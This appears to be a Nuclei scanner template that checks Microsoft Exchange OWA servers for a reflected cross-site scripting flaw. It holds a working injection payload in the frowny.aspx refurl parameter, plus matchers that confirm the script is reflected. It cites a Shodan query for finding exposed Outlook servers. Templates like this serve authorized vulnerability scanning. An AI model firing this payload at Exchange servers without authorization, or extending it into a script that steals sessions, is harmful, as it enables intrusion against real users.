id: ms-exchange-server-reflected-xss
info:
  author: infosecsanyam
  name: MS Exchange Server XSS
  reference:
  - https://www.shodan.io/search?query=http.title%3A%22Outlook%22
  - https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html
  severity: medium
  tags: microsoft,exchange,owa,xss
requests:
- matchers:
  - condition: and
    type: word
    words:
    - alert(document.domain)//&et=ServerError
    - mail/bootr.ashx
  - status:
    - 500
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//'
